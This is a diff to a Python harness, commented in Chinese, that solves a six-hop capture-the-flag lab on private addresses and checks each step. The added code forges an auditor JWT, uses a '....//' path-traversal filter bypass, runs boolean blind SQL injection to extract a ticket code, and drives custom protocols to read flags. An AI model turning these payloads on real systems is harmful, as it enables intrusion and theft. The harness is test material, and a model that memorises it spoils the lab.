@@ -9,8 +9,11 @@ import base64
 import hashlib
 import hmac
 import json
+import os
+import re
 import socket
 import sys
+import time
 import urllib.parse
 import urllib.request
 import zlib
@@ -344,6 +347,322 @@ check('c01 vault 错误签名被拒', 'bad signature' in str(vault_cmd('GET flag
 check('c01 vault KEYS 列出 flag:4', 'flag:4' in (vault_cmd('KEYS *') or []))
 out = vault_cmd('GET flag:4')
 check('c01 签名命令读取 flag4', C01[3] in (out or ''), f'got={out!r}')
+sock.close()
+
+# ---------------- d02：六跳冷链路（门户→认证→中继→归档→网关→保险库） ----------------
+D02 = DEFS['tsb-lab-d02']['flags']
+EDGE = 'http://10.66.0.41'
+
+
+def xor_bytes(left, right):
+    return bytes(a ^ b for a, b in zip(left, right))
+
+
+def crc16(data):
+    crc = 0xFFFF
+    for byte in data:
+        crc ^= byte << 8
+        for _ in range(8):
+            crc = ((crc << 1) ^ 0x1021) & 0xFFFF if crc & 0x8000 else (crc << 1) & 0xFFFF
+    return crc
+
+
+# 跳1：30 节点封条链 → 拼接摘要 → flag1 + 认证种子
+s, robots, _ = http(EDGE + '/robots.txt')
+head_match = re.search(r'seal-head:\s*([0-9a-f]{6})', robots)
+check('d02 robots 泄露封条链头', s == 200 and head_match is not None)
+ref = head_match.group(1) if head_match else ''
+nodes = []
+for _ in range(40):
+    s, body, _ = http(f'{EDGE}/seal/{ref}')
+    if s != 200:
+        break
+    node = json.loads(body)
+    nodes.append(node)
+    nxt = node.get('next')
+    if node['tag'] == 'K':
+        nxt = hashlib.sha256(node['part'].encode()).hexdigest()[:6]
+    ref = nxt
+    if not ref:
+        break
+check('d02 封条链逐节点走通（30 节点）', len(nodes) == 30, f'got={len(nodes)}')
+kept = sorted((n for n in nodes if n['tag'] == 'K'), key=lambda n: n['node'])
+check('d02 保留分片 10 片', len(kept) == 10)
+blob = b''
+for node in kept:
+    chunk = base64.b64decode(node['part'])
+    if node['node'] % 9 == 0:
+        chunk = bytes(b ^ (node['node'] & 0xFF) for b in chunk)
+    blob += chunk
+proof = hashlib.sha256(blob).hexdigest()[:32]
+s, body, _ = http(f'{EDGE}/redeem?proof={proof}')
+redeem = json.loads(body) if s == 200 else {}
+check('d02 拼接摘要换 flag1', redeem.get('flag') == D02[0], f'body={body[:200]}')
+s, body, _ = http(f'{EDGE}/redeem?proof=' + '0' * 32)
+check('d02 错误摘要被拒', s == 403)
+aud_seed = redeem.get('aud_seed', '')
+
+# 跳2：规范化 JWT + 6 轮挑战应答 → attest（中继种子 + 归档口令前半）
+header = {'alg': 'HS256', 'kid': 'edge-aud', 'typ': 'JWT'}
+payload = {'sub': aud_seed[:8], 'role': 'auditor', 'scope': ['mesh', 'archive'],
+           'exp': int(time.time()), 'nonce': os.urandom(8).hex()}
+jwt_key = hashlib.sha256((aud_seed + '|edge-aud').encode()).hexdigest()[:32].encode()
+head_b64 = b64url(json.dumps(header, separators=(',', ':')).encode())
+body_b64 = b64url(json.dumps(payload, separators=(',', ':')).encode())
+sig_b64 = b64url(hmac.new(jwt_key, f'{head_b64}.{body_b64}'.encode(), hashlib.sha256).digest())
+token = f'{head_b64}.{body_b64}.{sig_b64}'
+s, body, _ = http('http://10.66.0.42:8081/v1/session', data=b'',
+                  headers={'Authorization': 'Bearer ' + token})
+session = json.loads(body)
+check('d02 伪造 auditor JWT 建会话', s == 200 and session.get('rounds') == 6, f'body={body[:200]}')
+sid = session.get('session', '')
+challenge = session.get('challenge', '')
+prev = payload['nonce']
+for n in range(1, 7):
+    answer = hashlib.sha256(f'{challenge}|{prev}|{n}'.encode()).hexdigest()
+    s, body, _ = http(f'http://10.66.0.42:8081/v1/session/{sid}/answer',
+                      data=json.dumps({'round': n, 'answer': answer}).encode(),
+                      headers={'Content-Type': 'application/json'})
+    prev = answer
+    if n < 6:
+        check(f'd02 挑战应答第 {n} 轮', s == 200 and json.loads(body).get('next_hint') ==
+              hashlib.sha256(f'{challenge}|{answer}|{n + 1}'.encode()).hexdigest()[:8])
+s, body, _ = http('http://10.66.0.42:8081/v1/attest',
+                  data=json.dumps({'session': sid}).encode(),
+                  headers={'Content-Type': 'application/json'})
+attest = json.loads(body)
+check('d02 attest 下发中继种子与口令前半', s == 200 and len(attest.get('mesh_seed', '')) == 24
+      and len(attest.get('archive_pass_a', '')) == 20, f'body={body[:200]}')
+mesh_seed = attest.get('mesh_seed', '')
+pass_a = attest.get('archive_pass_a', '')
+
+# 跳3：CHN2 二进制帧（HELLO→RESP→OPEN 异或路由表→ROUTE）
+sock = socket.create_connection(('10.66.0.43', 9000), timeout=10)
+reader = sock.makefile('rb')
+banner = reader.readline().decode('utf-8', 'replace')
+check('d02 中继下发 CHN2 协议提示', banner.startswith('CHN2') and 'CCITT-FALSE' in banner)
+
+
+def mesh_send(ftype, data=b''):
+    head = bytes([ftype]) + len(data).to_bytes(2, 'big')
+    sock.sendall(b'CHN2' + head + crc16(head + data).to_bytes(2, 'big') + data)
+
+
+def mesh_recv():
+    head = reader.read(9)
+    assert head[:4] == b'CHN2', head
+    ftype = head[4]
+    length = int.from_bytes(head[5:7], 'big')
+    crc = int.from_bytes(head[7:9], 'big')
+    data = reader.read(length) if length else b''
+    assert crc16(head[4:7] + data) == crc, 'frame crc mismatch'
+    return ftype, data
+
+
+mesh_send(1, b'MESH1' + mesh_seed.encode())
+ftype, data = mesh_recv()
+check('d02 中继回 CHALLENGE 帧', ftype == 2 and len(data) == 16)
+nonce8, mask8 = data[:8], data[8:]
+resp = xor_bytes(hashlib.sha256(nonce8 + mesh_seed.encode()).digest()[:8], mask8)
+mesh_send(3, resp)
+ftype, data = mesh_recv()
+sid4, enc = data[:4], data[4:]
+check('d02 RESP 通过并取得加密路由表', ftype == 4 and len(enc) == 512)
+route_key = hashlib.sha256(sid4 + mesh_seed.encode()).digest()[:16]
+table = json.loads(xor_bytes(enc, route_key * 32).rstrip(b' ').decode())
+valid = None
+for entry in table['routes']:
+    code = bytes.fromhex(entry['code'])
+    expect = hashlib.sha256(sid4 + code + mesh_seed.encode()).hexdigest()[:16]
+    if expect == entry['digest']:
+        valid = (code, entry['digest'])
+check('d02 路由表仅 1 条摘要自洽', valid is not None)
+mesh_send(5, valid[0] + bytes.fromhex(valid[1]))
+ftype, data = mesh_recv()
+grant = json.loads(data) if ftype == 7 else {}
+check('d02 ROUTE 换归档口令后半', len(grant.get('archive_pass_b', '')) == 20, f'frame={ftype}')
+pass_b = grant.get('archive_pass_b', '')
+sock.close()
+
+# 跳4：归档登录 → 文档 → 渲染器穿越读网关密钥 → 托管证明换 flag2
+archive_pass = pass_a + pass_b
+archive_auth = 'archivist:' + archive_pass
+s, body, _ = http('http://10.66.0.44:8082/docs/view?name=custody.txt', auth=archive_auth)
+check('d02 组合口令进归档服务', s == 200 and 'gateway.key' in body, f's={s}')
+s, body, _ = http('http://10.66.0.44:8082/docs/view?name=render.txt', auth=archive_auth)
+check('d02 渲染器说明可读（ARCH-2211）', s == 200 and 'ARCH-2211' in body)
+bypass = urllib.parse.quote('....//....//data/gateway.key', safe='')
+s, body, _ = http('http://10.66.0.44:8082/render?tpl=' + bypass, auth=archive_auth)
+gateway_key = body.strip()
+check('d02 单次过滤穿越读网关密钥', s == 200 and re.fullmatch(r'[0-9a-f]{32}', gateway_key) is not None,
+      f's={s} body={body[:120]!r}')
+bad = urllib.parse.quote('....//....//data/flag2.txt', safe='')
+s, body, _ = http('http://10.66.0.44:8082/render?tpl=' + bad, auth=archive_auth)
+check('d02 后缀白名单阻断直读 flag2', s == 403)
+custody_proof = hashlib.sha256(
+    f'{gateway_key}|archivist|{archive_pass}'.encode()).hexdigest()
+s, body, _ = http('http://10.66.0.44:8082/custody',
+                  auth=archive_auth,
+                  data=urllib.parse.urlencode({'proof': custody_proof}).encode(),
+                  headers={'Content-Type': 'application/x-www-form-urlencoded'})
+custody = json.loads(body) if s == 200 else {}
+check('d02 托管证明换 flag2 + 三分区入口', custody.get('flag') == D02[1]
+      and len(custody.get('branches', [])) == 3, f'body={body[:200]}')
+branches = {b['name']: b for b in custody.get('branches', [])}
+
+# 跳4.5：分区 A — 布尔盲注还原票据码
+branch_a = branches['ticket']
+ticket_a = branch_a['ticket']
+
+
+def ticket_oracle(payload):
+    q = urllib.parse.urlencode({'t': ticket_a, 'code': payload})
+    s, body, _ = http(branch_a['url'] + '/verify?' + q)
+    return s == 200 and json.loads(body).get('match') is True
+
+
+check('d02 分区A 布尔盲注可用（1=1 真 / 1=2 假）',
+      ticket_oracle("x' OR 1=1 -- ") and not ticket_oracle("x' OR 1=2 -- "))
+CHARS = '0123456789abcdef'
+code_a = ''
+for i in range(1, 21):
+    lo, hi = 0, len(CHARS) - 1
+    while lo < hi:
+        mid = (lo + hi + 1) // 2
+        probe = (f"x' OR substr((SELECT code FROM tickets WHERE id=1),{i},1) "
+                 f">= '{CHARS[mid]}' -- ")
+        if ticket_oracle(probe):
+            lo = mid
+        else:
+            hi = mid - 1
+    code_a += CHARS[lo]
+check('d02 分区A 盲注还原 20 位票据码', re.fullmatch(r'[0-9a-f]{20}', code_a) is not None, code_a)
+s, body, _ = http(branch_a['url'] + '/claim?' + urllib.parse.urlencode(
+    {'t': ticket_a, 'code': code_a}))
+part_a = json.loads(body).get('part', '') if s == 200 else ''
+check('d02 分区A 取得种子段', len(part_a) == 20, f'body={body[:120]}')
+
+# 跳4.6：分区 B — 24 步状态机（错误回退）
+branch_b = branches['zone']
+sock = socket.create_connection(('10.66.0.48', 9300), timeout=10)
+reader = sock.makefile('rb')
+reader.readline()
+reader.readline()
+sock.sendall(f"OPEN {branch_b['ticket']}\r\n".encode())
+line = reader.readline().decode().strip().split()
+check('d02 分区B 开场下发 STEP', line and line[0] == '+STEP', ' '.join(line))
+nonce = line[2]
+sock.sendall(b'Z 1 deadbeef0000\r\n')
+line = reader.readline().decode().strip().split()
+check('d02 分区B 错误步骤触发 RESET', line and line[0] == '+RESET', ' '.join(line))
+nonce = line[2]
+prev = branch_b['ticket']
+part_b = ''
+for n in range(1, 25):
+    salt = 'z1' if n % 2 else 'z2'
+    token = hashlib.sha256(f'{salt}|{nonce}|{n}|{prev}'.encode()).hexdigest()[:12]
+    sock.sendall(f'Z {n} {token}\r\n'.encode())
+    line = reader.readline().decode().strip()
+    prev = token
+    if n < 24:
+        if not line.startswith(f'+OK {n + 1}'):
+            check(f'd02 分区B 第 {n} 步', False, line)
+            break
+    else:
+        parts_b = line.split()
+        check('d02 分区B 24 步完成取得种子段',
+              parts_b[0] == '+PART' and len(parts_b[1]) == 20, line)
+        part_b = parts_b[1] if len(parts_b) > 1 else ''
+sock.close()
+
+# 跳4.7：分区 C — 二进制冷库包解析
+branch_c = branches['pack']
+sock = socket.create_connection(('10.66.0.49', 9400), timeout=10)
+reader = sock.makefile('rb')
+reader.readline()
+reader.readline()
+sock.sendall(f"OPEN {branch_c['ticket']}\r\n".encode())
+check('d02 分区C 开场', reader.readline().decode().startswith('+OK'))
+sock.sendall(b'GET\r\n')
+line = reader.readline().decode().strip()
+packet = reader.read(int(line.split()[1])) if line.startswith('+LEN') else b''
+
+
+def crc8(data):
+    crc = 0
+    for byte in data:
+        crc ^= byte
+        for _ in range(8):
+            crc = ((crc << 1) ^ 0x07) & 0xFF if crc & 0x80 else (crc << 1) & 0xFF
+    return crc
+
+
+part_c = ''
+if packet[:4] == b'CSPK':
+    count = int.from_bytes(packet[5:7], 'big')
+    offset = 7
+    best_id, best_payload = -1, b''
+    for _ in range(count):
+        rid, flags, size, crc_field = packet[offset], packet[offset + 1], packet[offset + 2], packet[offset + 3]
+        payload = packet[offset + 4:offset + 4 + size]
+        offset += 4 + size
+        if flags & 0x01 and not flags & 0x02 and crc8(payload) == crc_field and rid > best_id:
+            best_id, best_payload = rid, payload
+    part_c = best_payload.decode('utf-8', 'replace')
+check('d02 分区C 解析出最高有效记录', re.fullmatch(r'[0-9a-f]{20}', part_c) is not None, part_c)
+sock.close()
+
+gate_seed = part_a + part_b + part_c
+check('d02 三段种子拼接（60 位）', len(gate_seed) == 60)
+
+# 跳5：网关 24 轮 HMAC 阶梯 → 保险库地址与种子
+sock = socket.create_connection(('10.66.0.45', 9100), timeout=10)
+reader = sock.makefile('rb')
+reader.readline()
+reader.readline()
+sock.sendall(f'HELLO {gate_seed}\r\n'.encode())
+line = reader.readline().decode('utf-8', 'replace').strip()
+parts = line.split()
+check('d02 网关进入 24 轮阶梯', parts and parts[0] == '+LADDER' and parts[2] == '24', line)
+gate_token = parts[1]
+gate_key = gateway_key.encode()
+prev = gate_seed
+vault_seed = ''
+for n in range(1, 25):
+    answer = hmac.new(gate_key, f'{gate_token}|{n}|{prev}'.encode(),
+                      hashlib.sha256).hexdigest()[:16]
+    sock.sendall(f'R {n} {answer}\r\n'.encode())
+    line = reader.readline().decode('utf-8', 'replace').strip()
+    prev = answer
+    if n < 24:
+        check(f'd02 阶梯第 {n} 轮', line == f'+OK {n + 1}', line)
+    else:
+        grant_line = line.split()
+        check('d02 阶梯完成下发保险库种子', grant_line[0] == '+GRANT'
+              and grant_line[1] == '10.66.0.46:6380', line)
+        vault_seed = grant_line[2] if len(grant_line) > 2 else ''
+sock.close()
+
+# 跳6：保险库计数器绑定签名 → flag3
+sock = socket.create_connection(('10.66.0.46', 6380), timeout=10)
+reader = sock.makefile('rb')
+reader.readline()
+reader.readline()
+sock.sendall(f'AUTH {vault_seed}\r\n'.encode())
+check('d02 保险库 AUTH', reader.readline().decode().startswith('+OK'))
+
+
+def vault_sign(ctr, cmd):
+    sig = hmac.new(gate_key, f'{ctr}|{cmd}|{vault_seed}'.encode(),
+                   hashlib.sha256).hexdigest()[:32]
+    sock.sendall(f'SIG {ctr} {sig} {cmd}\r\n'.encode())
+    return reader.readline().decode('utf-8', 'replace').strip()
+
+
+check('d02 保险库 KEYS 列出 flag:3', 'flag:3' in vault_sign(1, 'KEYS'))
+value = vault_sign(2, 'GET flag:3')
+check('d02 签名命令读取 flag3', D02[2] in value, f'got={value!r}')
+check('d02 计数器重放被拒', 'stale counter' in vault_sign(2, 'GET flag:3'))
 sock.close()
 
 print(f'== 结果: {passed} 通过, {failed} 失败 ==')
